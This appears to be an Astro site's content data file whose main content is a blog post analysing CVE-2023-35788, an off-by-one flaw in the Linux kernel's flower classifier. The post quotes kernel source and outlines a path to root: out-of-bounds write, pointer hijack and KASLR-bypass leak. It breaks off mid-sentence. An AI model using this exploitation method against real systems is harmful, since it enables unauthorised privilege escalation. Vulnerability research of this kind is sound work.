[["Map",1,2,9,10,73,74],"meta::meta",["Map",3,4,5,6,7,8],"astro-version","5.13.7","content-config-digest","3cd99930aaf918f7","astro-config-digest","{\"root\":{},\"srcDir\":{},\"publicDir\":{},\"outDir\":{},\"cacheDir\":{},\"site\":\"https://astroship.web3templates.com\",\"compressHTML\":true,\"base\":\"/\",\"trailingSlash\":\"ignore\",\"output\":\"static\",\"scopedStyleStrategy\":\"attribute\",\"build\":{\"format\":\"directory\",\"client\":{},\"server\":{},\"assets\":\"_astro\",\"serverEntry\":\"entry.mjs\",\"redirects\":true,\"inlineStylesheets\":\"auto\",\"concurrency\":1},\"server\":{\"open\":false,\"host\":false,\"port\":4321,\"streaming\":true,\"allowedHosts\":[]},\"redirects\":{},\"image\":{\"endpoint\":{\"route\":\"/_image\"},\"service\":{\"entrypoint\":\"astro/assets/services/sharp\",\"config\":{}},\"domains\":[],\"remotePatterns\":[],\"responsiveStyles\":false},\"devToolbar\":{\"enabled\":true},\"markdown\":{\"syntaxHighlight\":{\"type\":\"shiki\",\"excludeLangs\":[\"math\"]},\"shikiConfig\":{\"langs\":[],\"langAlias\":{},\"theme\":\"github-dark\",\"themes\":{},\"wrap\":false,\"transformers\":[]},\"remarkPlugins\":[],\"rehypePlugins\":[],\"remarkRehype\":{},\"gfm\":true,\"smartypants\":true},\"i18n\":{\"defaultLocale\":\"en\",\"locales\":[\"en\",\"zh\"],\"routing\":{\"prefixDefaultLocale\":false,\"redirectToDefaultLocale\":true,\"fallbackType\":\"redirect\"}},\"security\":{\"checkOrigin\":true},\"env\":{\"schema\":{},\"validateSecrets\":false},\"experimental\":{\"clientPrerender\":false,\"contentIntellisense\":false,\"headingIdCompat\":false,\"preserveScriptOrder\":false,\"liveContentCollections\":false,\"csp\":false,\"staticImportMetaEnv\":false,\"chromeDevtoolsWorkspace\":false},\"legacy\":{\"collections\":false}}","team",["Map",11,12,33,34,53,54],"janette-lynch",{"id":11,"data":13,"filePath":20,"digest":21,"rendered":22,"legacyId":32},{"draft":14,"name":15,"title":16,"avatar":17,"publishDate":19},false,"Janette Lynch","Senior Director",{"src":18,"alt":15},"https://images.unsplash.com/photo-1580489944761-15a19d654956?&fit=crop&w=280",["Date","2022-11-07T07:39:00.000Z"],"src/content/team/janette-lynch.md","2e25c8665c06b7c0",{"html":23,"metadata":24},"",{"headings":25,"localImagePaths":26,"remoteImagePaths":27,"frontmatter":28,"imagePaths":31},[],[],[],{"draft":14,"name":15,"title":16,"avatar":29,"publishDate":30},{"src":18,"alt":15},"2022-11-07 15:39",[],"janette-lynch.md","marcell-ziemann",{"id":33,"data":35,"filePath":41,"digest":42,"rendered":43,"legacyId":52},{"draft":14,"name":36,"title":37,"avatar":38,"publishDate":40},"Marcell Ziemann","Principal Strategist",{"src":39,"alt":36},"https://images.unsplash.com/photo-1633332755192-727a05c4013d?&fit=crop&w=280",["Date","2022-11-08T07:39:00.000Z"],"src/content/team/marcell-ziemann.md","8a3729bb7d77acfb",{"html":23,"metadata":44},{"headings":45,"localImagePaths":46,"remoteImagePaths":47,"frontmatter":48,"imagePaths":51},[],[],[],{"draft":14,"name":36,"title":37,"avatar":49,"publishDate":50},{"src":39,"alt":36},"2022-11-08 15:39",[],"marcell-ziemann.md","robert-palmer",{"id":53,"data":55,"filePath":61,"digest":62,"rendered":63,"legacyId":72},{"draft":14,"name":56,"title":57,"avatar":58,"publishDate":60},"Robert Palmer","Marketing Engineer",{"src":59,"alt":56},"https://images.unsplash.com/photo-1535713875002-d1d0cf377fde?&fit=crop&w=280",["Date","2022-11-09T07:39:00.000Z"],"src/content/team/robert-palmer.md","953b143ee71ea47a",{"html":23,"metadata":64},{"headings":65,"localImagePaths":66,"remoteImagePaths":67,"frontmatter":68,"imagePaths":71},[],[],[],{"draft":14,"name":56,"title":57,"avatar":69,"publishDate":70},{"src":59,"alt":56},"2022-11-09 15:39",[],"robert-palmer.md","blog",["Map",75,76,137,138,183,184],"2024-04-15-cve-2023-35788",{"id":75,"data":77,"body":90,"filePath":91,"assetImports":92,"digest":101,"rendered":102,"legacyId":136},{"draft":14,"title":78,"snippet":79,"image":80,"publishDate":83,"author":84,"category":85,"tags":86},"Root linux via an off-by-one vulnerability(CVE-2023-35788)","The vulnerability is an off-by-one flaw located within the Linux network scheduler subsystem (NET_SCHED). It allows bypassing all protective measures (though a new namespace needs to be created) and enables privilege escalation on Linux systems.",{"src":81,"alt":82},"__ASTRO_IMAGE_/src/assets/blog_img/2024-04-15/linux.jpg","Root linux",["Date","2024-04-15T03:39:00.000Z"],"shuffle team","exploit",[87,88,89],"root","linux kernel","off-by-one","## 0x00 Introduction\n\nThe vulnerability is an off-by-one flaw located within the Linux network scheduler subsystem (NET_SCHED). It allows bypassing all protective measures (though a new namespace needs to be created) and enables privilege escalation on Linux systems.\n\nNET_SCHED in Linux is the Network Scheduler subsystem, which is responsible for traffic scheduling and management in the network stack. It provides a range of scheduling algorithms and queue management mechanisms, including priority queuing, token bucket scheduling, and random early detection, enabling users to flexibly control and optimize network traffic as needed.\n\nThis vulnerability is not a new one. It was already patched in Linux 6.4-rc5 (June 2023) by us. However, due to its interesting nature, involving out-of-bounds access within a structure, it does not cause a kernel crash when triggered. Moreover, its exploit stability is quite high. So, I have decided to outline the exploitation approach for this vulnerability.\n\nSince NET_SCHED is a well-known module that has experienced several vulnerabilities (you can check KCTF). This article will focus solely on the vulnerability itself.\n\n![meme1](../../assets/blog_img/2024-04-15/meme1.jpeg)\n\n## 0x01 Vulnerability Analysis\n\nThe vulnerability occurs in the Flower classifier of NET_SCHED.\n\nThe core function containing the vulnerability is `fl_set_geneve_opt()`. Below is the code snippet provided:\n\n```c\nstatic int fl_set_geneve_opt(const struct nlattr *nla, struct fl_flow_key *key,\n\t\t\t     int depth, int option_len,\n\t\t\t     struct netlink_ext_ack *extack)\n{\n\tstruct nlattr *tb[TCA_FLOWER_KEY_ENC_OPT_GENEVE_MAX + 1];\n\tstruct nlattr *class = NULL, *type = NULL, *data = NULL;\n\tstruct geneve_opt *opt;\n\tint err, data_len = 0;\n\n\tif (option_len > sizeof(struct geneve_opt))\n\t\tdata_len = option_len - sizeof(struct geneve_opt);\n\n\topt = (struct geneve_opt *)&key->enc_opts.data[key->enc_opts.len];\t\u003C--- [1]\n\tmemset(opt, 0xff, option_len);\n\topt->length = data_len / 4;\n\topt->r1 = 0;\n\topt->r2 = 0;\n\topt->r3 = 0;\n\n\t/* If no mask has been prodived we assume an exact match. */\n\tif (!depth)\n\t\treturn sizeof(struct geneve_opt) + data_len;\n\n\tif (nla_type(nla) != TCA_FLOWER_KEY_ENC_OPTS_GENEVE) {\n\t\tNL_SET_ERR_MSG(extack, \"Non-geneve option type for mask\");\n\t\treturn -EINVAL;\n\t}\n\n\terr = nla_parse_nested_deprecated(tb,\n\t\t\t\t\t  TCA_FLOWER_KEY_ENC_OPT_GENEVE_MAX,\n\t\t\t\t\t  nla, geneve_opt_policy, extack);\t\t\t\t\t\u003C--- [2]\n\tif (err \u003C 0)\n\t\treturn err;\n\n\t/* We are not allowed to omit any of CLASS, TYPE or DATA\n\t * fields from the key.\n\t */\n\tif (!option_len &&\n\t    (!tb[TCA_FLOWER_KEY_ENC_OPT_GENEVE_CLASS] ||\n\t     !tb[TCA_FLOWER_KEY_ENC_OPT_GENEVE_TYPE] ||\n\t     !tb[TCA_FLOWER_KEY_ENC_OPT_GENEVE_DATA])) {\n\t\tNL_SET_ERR_MSG(extack, \"Missing tunnel key geneve option class, type or data\");\n\t\treturn -EINVAL;\n\t}\n\n\t/* Omitting any of CLASS, TYPE or DATA fields is allowed\n\t * for the mask.\n\t */\n\tif (tb[TCA_FLOWER_KEY_ENC_OPT_GENEVE_DATA]) {\n\t\tint new_len = key->enc_opts.len;\t\t\t\t\t\t\t\t\u003C--- [3]\n\n\t\tdata = tb[TCA_FLOWER_KEY_ENC_OPT_GENEVE_DATA];\n\t\tdata_len = nla_len(data);\n\t\tif (data_len \u003C 4) {\t\t\t\t\t\t\t\t\t\t\t\t\u003C--- [4]\n\t\t\tNL_SET_ERR_MSG(extack, \"Tunnel key geneve option data is less than 4 bytes long\");\n\t\t\treturn -ERANGE;\n\t\t}\n\t\tif (data_len % 4) {\t\t\t\t\t\t\t\t\t\t\t\t\u003C--- [5]\n\t\t\tNL_SET_ERR_MSG(extack, \"Tunnel key geneve option data is not a multiple of 4 bytes long\");\n\t\t\treturn -ERANGE;\n\t\t}\n\n\t\tnew_len += sizeof(struct geneve_opt) + data_len;\n\t\tBUILD_BUG_ON(FLOW_DIS_TUN_OPTS_MAX != IP_TUNNEL_OPTS_MAX);\n\t\tif (new_len > FLOW_DIS_TUN_OPTS_MAX) {\t\t\t\t\t\t\t\u003C--- [6]\n\t\t\tNL_SET_ERR_MSG(extack, \"Tunnel options exceeds max size\");\n\t\t\treturn -ERANGE;\n\t\t}\n\t\topt->length = data_len / 4;\n\t\tmemcpy(opt->opt_data, nla_data(data), data_len);\t\t\t\t\u003C--- [7]\n\t}\n\n\tif (tb[TCA_FLOWER_KEY_ENC_OPT_GENEVE_CLASS]) {\n\t\tclass = tb[TCA_FLOWER_KEY_ENC_OPT_GENEVE_CLASS];\n\t\topt->opt_class = nla_get_be16(class);\n\t}\n\n\tif (tb[TCA_FLOWER_KEY_ENC_OPT_GENEVE_TYPE]) {\n\t\ttype = tb[TCA_FLOWER_KEY_ENC_OPT_GENEVE_TYPE];\n\t\topt->type = nla_get_u8(type);\n\t}\n\n\treturn sizeof(struct geneve_opt) + data_len;\n}\n```\n\nAt position [1], the function `fl_set_geneve_opt()` directly uses `key->enc_opts.len` as an array parameter, retrieving the `opt` structure from the `key->enc_opts.data` array, and setting the data of length `option_len` to 0xff. Additionally, some fields of the `opt` structure are initialized. Upon examining the `struct geneve_opt` structure of `opt`, it is evident that initializing the `geneve_opt` structure requires exactly 4 bytes.\n\n```c\nstruct geneve_opt {\n\t__be16\topt_class;\n\tu8\ttype;\n#ifdef __LITTLE_ENDIAN_BITFIELD\n\tu8\tlength:5;\n\tu8\tr3:1;\n\tu8\tr2:1;\n\tu8\tr1:1;\n#else\n\tu8\tr1:1;\n\tu8\tr2:1;\n\tu8\tr3:1;\n\tu8\tlength:5;\n#endif\n\tu8\topt_data[];\n};\n```\n\nContinuing to position [2], the function parses the user-provided packet data into the `tb` array. Additionally, due to the set `geneve_opt_policy`, if data of type TCA_FLOWER_KEY_ENC_OPT_GENEVE_DATA is passed in (parsed at position [3]), it must not exceed 128 bytes.\n\n```c\nstatic const struct nla_policy\ngeneve_opt_policy[TCA_FLOWER_KEY_ENC_OPT_GENEVE_MAX + 1] = {\n\t[TCA_FLOWER_KEY_ENC_OPT_GENEVE_CLASS]      = { .type = NLA_U16 },\n\t[TCA_FLOWER_KEY_ENC_OPT_GENEVE_TYPE]       = { .type = NLA_U8 },\n\t[TCA_FLOWER_KEY_ENC_OPT_GENEVE_DATA]       = { .type = NLA_BINARY,\n\t\t\t\t\t\t       .len = 128 },\n};\n```\n\nHere we arrive at position [3]. We can observe that the variable `key->enc_opts.len`, used for the array, is assigned to `new_len`. Since `tb` is user-supplied data, positions [4] and [5] are used to ensure that the data we pass in is divisible by 4 and greater than the packet header, i.e., the `struct geneve_opt` structure. Then, at position [6], the code checks whether the length of `key->enc_opts.len` plus the length of our newly passed packet data is less than 255, which is the size of the `key->enc_opts.data` array. After this series of validations, the data is finally copied to the `opt_data` field of `geneve_opt` using `memcpy` at position [7]. In the end, `fl_set_geneve_opt` will return the length of the new packet header plus the length of the data.\n\nNow, let's see how `key->enc_opts.len` is assigned.\n\n```c\nstatic int fl_set_enc_opt(struct nlattr **tb, struct fl_flow_key *key,\n\t\t\t  struct fl_flow_key *mask,\n\t\t\t  struct netlink_ext_ack *extack)\n{\n...\n\tif (tb[TCA_FLOWER_KEY_ENC_OPTS_MASK]) {\n\t\terr = nla_validate_nested_deprecated(tb[TCA_FLOWER_KEY_ENC_OPTS_MASK],\n\t\t\t\t\t\t     TCA_FLOWER_KEY_ENC_OPTS_MAX,\n\t\t\t\t\t\t     enc_opts_policy, extack);\n\t\tif (err)\n\t\t\treturn err;\n\n\t\tnla_opt_msk = nla_data(tb[TCA_FLOWER_KEY_ENC_OPTS_MASK]);\n\t\tmsk_depth = nla_len(tb[TCA_FLOWER_KEY_ENC_OPTS_MASK]);\n\t\tif (!nla_ok(nla_opt_msk, msk_depth)) {\n\t\t\tNL_SET_ERR_MSG(extack, \"Invalid nested attribute for masks\");\n\t\t\treturn -EINVAL;\n\t\t}\n\t}\n\n\tnla_for_each_attr(nla_opt_key, nla_enc_key,\n\t\t\t  nla_len(tb[TCA_FLOWER_KEY_ENC_OPTS]), key_depth) {\n\t\tswitch (nla_type(nla_opt_key)) {\n\t\tcase TCA_FLOWER_KEY_ENC_OPTS_GENEVE:\n\t\t\tif (key->enc_opts.dst_opt_type &&\n\t\t\t    key->enc_opts.dst_opt_type != TUNNEL_GENEVE_OPT) {\n\t\t\t\tNL_SET_ERR_MSG(extack, \"Duplicate type for geneve options\");\n\t\t\t\treturn -EINVAL;\n\t\t\t}\n\t\t\toption_len = 0;\n\t\t\tkey->enc_opts.dst_opt_type = TUNNEL_GENEVE_OPT;\n\t\t\toption_len = fl_set_geneve_opt(nla_opt_key, key,\t\n\t\t\t\t\t\t       key_depth, option_len,\n\t\t\t\t\t\t       extack);\n\t\t\tif (option_len \u003C 0)\n\t\t\t\treturn option_len;\n\n\t\t\tkey->enc_opts.len += option_len;\t\t\t\t\t\t\u003C--- [8]\n\t\t\t/* At the same time we need to parse through the mask\n\t\t\t * in order to verify exact and mask attribute lengths.\n\t\t\t */\n\t\t\tmask->enc_opts.dst_opt_type = TUNNEL_GENEVE_OPT;\n\t\t\toption_len = fl_set_geneve_opt(nla_opt_msk, mask,\n\t\t\t\t\t\t       msk_depth, option_len,\n\t\t\t\t\t\t       extack);\n\t\t\tif (option_len \u003C 0)\n\t\t\t\treturn option_len;\n\n\t\t\tmask->enc_opts.len += option_len;\t\t\t\t\t\t\u003C--- [9]\n\t\t\tif (key->enc_opts.len != mask->enc_opts.len) {\t\t\t\u003C--- [10]\n\t\t\t\tNL_SET_ERR_MSG(extack, \"Key and mask miss aligned\");\n\t\t\t\treturn -EINVAL;\n\t\t\t}\n\t\t\tbreak;\n...\n\t\tif (!msk_depth)\n\t\t\tcontinue;\n\n\t\tif (!nla_ok(nla_opt_msk, msk_depth)) {\n\t\t\tNL_SET_ERR_MSG(extack, \"A mask attribute is invalid\");\n\t\t\treturn -EINVAL;\n\t\t}\n\t\tnla_opt_msk = nla_next(nla_opt_msk, &msk_depth);\n\t}\n}\n```\n\nWe observe that the higher-level function of `fl_set_geneve_opt` is `fl_set_enc_opt`. `fl_set_enc_opt` is responsible for determining the possibility of passing in multiple data packets. Therefore, it iterates internally to parse each packet of `TCA_FLOWER_KEY_ENC_OPTS_GENEVE` type. These packets are categorized into key and mask types, with the requirement that there must be a key before a mask, and the lengths of the key and mask must be equal (checked at position [10]). The `enc_opts.len` we are concerned with represents the cumulative length of the data packets already passed in.\n\nSo far, it appears there isn't an issue because even if there's an array overflow at position [1], the lengths of `key->enc_opts.len` and the subsequent data packets will be checked, and the process will fail due to failed validation. \n\n![meme2](../../assets/blog_img/2024-04-15/meme2.png)\n\nHowever, let's take a closer look at the structure containing this potentially overflowing array.\n\n```c\nstruct flow_dissector_key_enc_opts {\n\tu8 data[FLOW_DIS_TUN_OPTS_MAX];\t/* Using IP_TUNNEL_OPTS_MAX is desired\n\t\t\t\t\t * here but seems difficult to #include\n\t\t\t\t\t */\n\tu8 len;\n\t__be16 dst_opt_type;\n};\n```\n\nThe `data` array is of length 255, followed immediately by `len`, which is of type `u8`, occupying just one byte with a maximum value of 255. However, the issue arises here. Suppose we pass in two or more data packets with a cumulative total size of 252. Due to the initialization of a 4-byte `struct geneve_opt` header directly at position [1], an off-by-one error occurs. Fortunately, this off-by-one error precisely overwrites the `len` field of the `flow_dissector_key_enc_opts` structure. Thus, relying on this off-by-one error, we can access position `key->enc_opts.data[252]`. However, `key->enc_opts.len` is overwritten with a value less than 128 (calculated as 4 + package length/4 + package length). This means `key->enc_opts.len = opt->length = data_len / 4`. Consequently, we can bypass the checks at positions [4], [5], and [6], resulting in an out-of-bounds write of up to 128 bytes.\n\n## 0x02 Exploit\n\nNow that we have a maximum of 128 bytes for the out-of-bounds write, since the overflow occurs in a nested structure, let's first trace the function call chain of `fl_set_geneve_opt`.\n\n![1](../../assets/blog_img/2024-04-15/1.png)\n\nAs shown in the above diagram, the top-level functions are `tc_new_tfilter` and `tc_ctl_chain`.\n\n```c\nstatic int __init tc_filter_init(void)\n{\n\tint err;\n\n\ttc_filter_wq = alloc_ordered_workqueue(\"tc_filter_workqueue\", 0);\n\tif (!tc_filter_wq)\n\t\treturn -ENOMEM;\n\n\terr = register_pernet_subsys(&tcf_net_ops);\n\tif (err)\n\t\tgoto err_register_pernet_subsys;\n\n\trtnl_register(PF_UNSPEC, RTM_NEWTFILTER, tc_new_tfilter, NULL,\n\t\t      RTNL_FLAG_DOIT_UNLOCKED);\n\trtnl_register(PF_UNSPEC, RTM_DELTFILTER, tc_del_tfilter, NULL,\n\t\t      RTNL_FLAG_DOIT_UNLOCKED);\n\trtnl_register(PF_UNSPEC, RTM_GETTFILTER, tc_get_tfilter,\n\t\t      tc_dump_tfilter, RTNL_FLAG_DOIT_UNLOCKED);\n\trtnl_register(PF_UNSPEC, RTM_NEWCHAIN, tc_ctl_chain, NULL, 0);\n\trtnl_register(PF_UNSPEC, RTM_DELCHAIN, tc_ctl_chain, NULL, 0);\n\trtnl_register(PF_UNSPEC, RTM_GETCHAIN, tc_ctl_chain,\n\t\t      tc_dump_chain, 0);\n\n\treturn 0;\n\nerr_register_pernet_subsys:\n\tdestroy_workqueue(tc_filter_wq);\n\treturn err;\n}\n```\n\n\nHere, `tc_new_tfilter` and `tc_ctl_chain` are respectively called when the user passes in types such as RTM_NEWTFILTER and RTM_NEWCHAIN via Netlink.\n\nThe intermediate layer's virtual functions are located in `cls_fl_ops`. Positions [11] and [12] are where we can trigger the vulnerable function.\n\n```c\nstatic struct tcf_proto_ops cls_fl_ops __read_mostly = {\n\t.kind\t\t= \"flower\",\n\t.classify\t= fl_classify,\n\t.init\t\t= fl_init,\n\t.destroy\t= fl_destroy,\n\t.get\t\t= fl_get,\n\t.put\t\t= fl_put,\n\t.change\t\t= fl_change,\t\t\t\t\u003C--- [11]\n\t.delete\t\t= fl_delete,\n\t.delete_empty\t= fl_delete_empty,\n\t.walk\t\t= fl_walk,\n\t.reoffload\t= fl_reoffload,\n\t.hw_add\t\t= fl_hw_add,\n\t.hw_del\t\t= fl_hw_del,\n\t.dump\t\t= fl_dump,\n\t.terse_dump\t= fl_terse_dump,\n\t.bind_class\t= fl_bind_class,\n\t.tmplt_create\t= fl_tmplt_create,\t\t\u003C--- [12]\n\t.tmplt_destroy\t= fl_tmplt_destroy,\n\t.tmplt_dump\t= fl_tmplt_dump,\n\t.owner\t\t= THIS_MODULE,\n\t.flags\t\t= TCF_PROTO_OPS_DOIT_UNLOCKED,\n};\n```\n\nOnce we've identified the call chain, we can follow these two chains to find the objects we can overflow. The two directly overflowable objects are as follows:\n\n```c\nstruct fl_flow_tmplt {\n\tstruct fl_flow_key dummy_key;      \u003C--- [13]\n\tstruct fl_flow_key mask;\t\t   \u003C--- [14]\n\tstruct flow_dissector dissector;\n\tstruct tcf_chain *chain;\n};\n\nstruct cls_fl_filter {\n\tstruct fl_flow_mask *mask;\n\tstruct rhash_head ht_node;\n\tstruct fl_flow_key mkey;\n\tstruct tcf_exts exts;\n\tstruct tcf_result res;\n\tstruct fl_flow_key key;\t\t\t\t \u003C--- [15]\n\tstruct list_head list;\n\tstruct list_head hw_list;\n\tu32 handle;\n\tu32 flags;\n\tu32 in_hw_count;\n\tstruct rcu_work rwork;\n\tstruct net_device *hw_dev;\n\t/* Flower classifier is unlocked, which means that its reference counter\n\t * can be changed concurrently without any kind of external\n\t * synchronization. Use atomic reference counter to be concurrency-safe.\n\t */\n\trefcount_t refcnt;\n\tbool deleted;\n};\n```\n\nWe focus on the `fl_flow_tmplt` structure. Since we can overflow 128 bytes and overwrite the object pointer of `chain`, modifying `chain` allows us to perform interesting fabrications when `fl_flow_tmplt` calls this object. Additionally, we find that the `cls_fl_ops` virtual functions include a `fl_tmplt_destroy` function.\n\n```c\nstatic void fl_tmplt_destroy(void *tmplt_priv)\n{\n\tstruct fl_flow_tmplt *tmplt = tmplt_priv;\n\n\tfl_hw_destroy_tmplt(tmplt->chain, tmplt);\t\t\t\t\t\t\t\u003C--- [16]\n\tkfree(tmplt);\n}\n\nstatic void fl_hw_destroy_tmplt(struct tcf_chain *chain,\n\t\t\t\tstruct fl_flow_tmplt *tmplt)\n{\n\tstruct flow_cls_offload cls_flower = {};\n\tstruct tcf_block *block = chain->block;\t\t\t\t\t\t\t\t\u003C--- [17]\n\n\tcls_flower.common.chain_index = chain->index;\n\tcls_flower.command = FLOW_CLS_TMPLT_DESTROY;\n\tcls_flower.cookie = (unsigned long) tmplt;\n\n\ttc_setup_cb_call(block, TC_SETUP_CLSFLOWER, &cls_flower, false, true);\n}\n\nint tc_setup_cb_call(struct tcf_block *block, enum tc_setup_type type,\n\t\t     void *type_data, bool err_stop, bool rtnl_held)\n{\n\tbool take_rtnl = READ_ONCE(block->lockeddevcnt) && !rtnl_held;\n\tint ok_count;\n\nretry:\n\tif (take_rtnl)\n\t\trtnl_lock();\n\tdown_read(&block->cb_lock);\n\t/* Need to obtain rtnl lock if block is bound to devs that require it.\n\t * In block bind code cb_lock is obtained while holding rtnl, so we must\n\t * obtain the locks in same order here.\n\t */\n\tif (!rtnl_held && !take_rtnl && block->lockeddevcnt) {\n\t\tup_read(&block->cb_lock);\n\t\ttake_rtnl = true;\n\t\tgoto retry;\n\t}\n\n\tok_count = __tc_setup_cb_call(block, type, type_data, err_stop);\t\u003C--- [18]\n\n\tup_read(&block->cb_lock);\n\tif (take_rtnl)\n\t\trtnl_unlock();\n\treturn ok_count;\n}\n\nstatic int\n__tc_setup_cb_call(struct tcf_block *block, enum tc_setup_type type,\n\t\t   void *type_data, bool err_stop)\n{\n\tstruct flow_block_cb *block_cb;\n\tint ok_count = 0;\n\tint err;\n\n\tlist_for_each_entry(block_cb, &block->flow_block.cb_list, list) {\n\t\terr = block_cb->cb(type, type_data, block_cb->cb_priv);\t\t\t\u003C--- [19] \n\t\tif (err) {\n\t\t\tif (err_stop)\n\t\t\t\treturn err;\n\t\t} else {\n\t\t\tok_count++;\n\t\t}\n\t}\n\treturn ok_count;\n}\n```\n\nBy tracing the `fl_tmplt_destroy` function, we can observe that at position [16], we can control `tmplt->chain`. Therefore, at positions [17] and [18], we can control `block`. At position [19], we have a suitable pointer, enabling control flow hijacking.\n\nAt this point, our strategy is clear. We need to leak a controllable heap address, while simultaneously bypassing KASLR to obtain usable function pointers. Both of these tasks require out-of-bounds reads.\n\n### Transforming the off-by-one vulnerability into an out-of-bounds read vulnerability\n\nWe need out-of-bounds reads, and conveniently, from `cls_fl_ops`, we can see two functions that transfer data from the kernel to user space: `fl_dump` and `fl_tmplt_dump`. These correspond to the two vulnerable functions we just discussed.\n\n```c\nstatic struct tcf_proto_ops cls_fl_ops __read_mostly = {\n\t.kind\t\t= \"flower\",\n...\n\t.change\t\t= fl_change,\t\t\t\t\u003C--- [11]\n\t.delete\t\t= fl_delete,\n...\n\t.dump\t\t= fl_dump,\n\t.terse_dump\t= fl_terse_dump,\n\t.bind_class\t= fl_bind_class,\n\t.tmplt_create\t= fl_tmplt_create,\t\t\u003C--- [12]\n\t.tmplt_destroy\t= fl_tmplt_destroy,\n\t.tmplt_dump\t= fl_tmplt_dump,\n\t.owner\t\t= THIS_MODULE,\n\t.flags\t\t= TCF_PROTO_OPS_DOIT_UNLOCKED,\n};\n```\n\nFollowing the call chains of these two functions, it's logical to use `fl_dump_key_geneve_opt` to retrieve the data we previously passed in.\n\n```\nfl_dump_key -> fl_dump_key_enc_opt -> fl_dump_key_options->fl_dump_key_geneve_opt\n```\n\nLet's take a closer look at `fl_dump_key_geneve_opt`.\n\n```c\nstatic int fl_dump_key_geneve_opt(struct sk_buff *skb,\n\t\t\t\t  struct flow_dissector_key_enc_opts *enc_opts)\n{\n\tstruct geneve_opt *opt;\n\tstruct nlattr *nest;\n\tint opt_off = 0;\n\n\tnest = nla_nest_start_noflag(skb, TCA_FLOWER_KEY_ENC_OPTS_GENEVE);\n\tif (!nest)\n\t\tgoto nla_put_failure;\n\n\twhile (enc_opts->len > opt_off) {\t\t\t\t\t\t\t\t\u003C--- [20]\n\t\topt = (struct geneve_opt *)&enc_opts->data[opt_off];\t\t\u003C--- [21]\n\n\t\tif (nla_put_be16(skb, TCA_FLOWER_KEY_ENC_OPT_GENEVE_CLASS,\n\t\t\t\t opt->opt_class))\n\t\t\tgoto nla_put_failure;\n\t\tif (nla_put_u8(skb, TCA_FLOWER_KEY_ENC_OPT_GENEVE_TYPE,\n\t\t\t       opt->type))\n\t\t\tgoto nla_put_failure;\n\t\tif (nla_put(skb, TCA_FLOWER_KEY_ENC_OPT_GENEVE_DATA,\n\t\t\t    opt->length * 4, opt->opt_data))\n\t\t\tgoto nla_put_failure;\n\n\t\topt_off += sizeof(struct geneve_opt) + opt->length * 4;\t\t\u003C--- [22]\n\t}\n\tnla_nest_end(skb, nest);\n\treturn 0;\n\nnla_put_failure:\n\tnla_nest_cancel(skb, nest);\n\treturn -EMSGSIZE;\n}\n```\n\n`fl_dump_key_geneve_opt` simply utilizes the previously controlled `enc_opts->len` to control the length, and copies data based on each `opt->length * 4`, sending it to user space.\n\nLet's return to `fl_set_geneve_opt`.\n\n```c\nstatic int fl_set_geneve_opt(const struct nlattr *nla, struct fl_flow_key *key,\n\t\t\t     int depth, int option_len,\n\t\t\t     struct netlink_ext_ack *extack)\n{\n\tstruct nlattr *tb[TCA_FLOWER_KEY_ENC_OPT_GENEVE_MAX + 1];\n\tstruct nlattr *class = NULL, *type = NULL, *data = NULL;\n\tstruct geneve_opt *opt;\n\tint err, data_len = 0;\n\n\tif (option_len > sizeof(struct geneve_opt))\n\t\tdata_len = option_len - sizeof(struct geneve_opt);\n\n\topt = (struct geneve_opt *)&key->enc_opts.data[key->enc_opts.len];\t\u003C--- [1]\n\tmemset(opt, 0xff, option_len);\n\topt->length = data_len / 4;\n\topt->r1 = 0;\n\topt->r2 = 0;\n\topt->r3 = 0;\n\n\t/* If no mask has been prodived we assume an exact match. */\n\tif (!depth)\n\t\treturn sizeof(struct geneve_opt) + data_len;\n\n\tif (nla_type(nla) != TCA_FLOWER_KEY_ENC_OPTS_GENEVE) {\n\t\tNL_SET_ERR_MSG(extack, \"Non-geneve option type for mask\");\n\t\treturn -EINVAL;\n\t}\n\n\terr = nla_parse_nested_deprecated(tb,\n\t\t\t\t\t  TCA_FLOWER_KEY_ENC_OPT_GENEVE_MAX,\n\t\t\t\t\t  nla, geneve_opt_policy, extack);\t\t\t\t\t\u003C--- [2]\n\tif (err \u003C 0)\n\t\treturn err;\n\n\t/* We are not allowed to omit any of CLASS, TYPE or DATA\n\t * fields from the key.\n\t */\n\tif (!option_len &&\n\t    (!tb[TCA_FLOWER_KEY_ENC_OPT_GENEVE_CLASS] ||\n\t     !tb[TCA_FLOWER_KEY_ENC_OPT_GENEVE_TYPE] ||\n\t     !tb[TCA_FLOWER_KEY_ENC_OPT_GENEVE_DATA])) {\n\t\tNL_SET_ERR_MSG(extack, \"Missing tunnel key geneve option class, type or data\");\n\t\treturn -EINVAL;\n\t}\n\n\t/* Omitting any of CLASS, TYPE or DATA fields is allowed\n\t * for the mask.\n\t */\n\tif (tb[TCA_FLOWER_KEY_ENC_OPT_GENEVE_DATA]) {\n\t\tint new_len = key->enc_opts.len;\t\t\t\t\t\t\t\t\u003C--- [3]\n\n\t\tdata = tb[TCA_FLOWER_KEY_ENC_OPT_GENEVE_DATA];\n\t\tdata_len = nla_len(data);\n\t\tif (data_len \u003C 4) {\t\t\t\t\t\t\t\t\t\t\t\t\u003C--- [4]\n\t\t\tNL_SET_ERR_MSG(extack, \"Tunnel key geneve option data is less than 4 bytes long\");\n\t\t\treturn -ERANGE;\n\t\t}\n\t\tif (data_len % 4) {\t\t\t\t\t\t\t\t\t\t\t\t\u003C--- [5]\n\t\t\tNL_SET_ERR_MSG(extack, \"Tunnel key geneve option data is not a multiple of 4 bytes long\");\n\t\t\treturn -ERANGE;\n\t\t}\n\n\t\tnew_len += sizeof(struct geneve_opt) + data_len;\n\t\tBUILD_BUG_ON(FLOW_DIS_TUN_OPTS_MAX != IP_TUNNEL_OPTS_MAX);\n\t\tif (new_len > FLOW_DIS_TUN_OPTS_MAX) {\t\t\t\t\t\t\t\u003C--- [6]\n\t\t\tNL_SET_ERR_MSG(extack, \"Tunnel options exceeds max size\");\n\t\t\treturn -ERANGE;\n\t\t}\n\t\topt->length = data_len / 4;\n\t\tmemcpy(opt->opt_data, nla_data(data), data_len);\t\t\t\t\u003C--- [7]\n\t}\n\n\tif (tb[TCA_FLOWER_KEY_ENC_OPT_GENEVE_CLASS]) {\n\t\tclass = tb[TCA_FLOWER_KEY_ENC_OPT_GENEVE_CLASS];\n\t\topt->opt_class = nla_get_be16(class);\n\t}\n\n\tif (tb[TCA_FLOWER_KEY_ENC_OPT_GENEVE_TYPE]) {\n\t\ttype = tb[TCA_FLOWER_KEY_ENC_OPT_GENEVE_TYPE];\n\t\topt->type = nla_get_u8(type);\n\t}\n\n\treturn sizeof(struct geneve_opt) + data_len;\n}\n```\n\nTriggering the off-by-one requires passing in two or more data packets, with their combined lengths totaling exactly 252 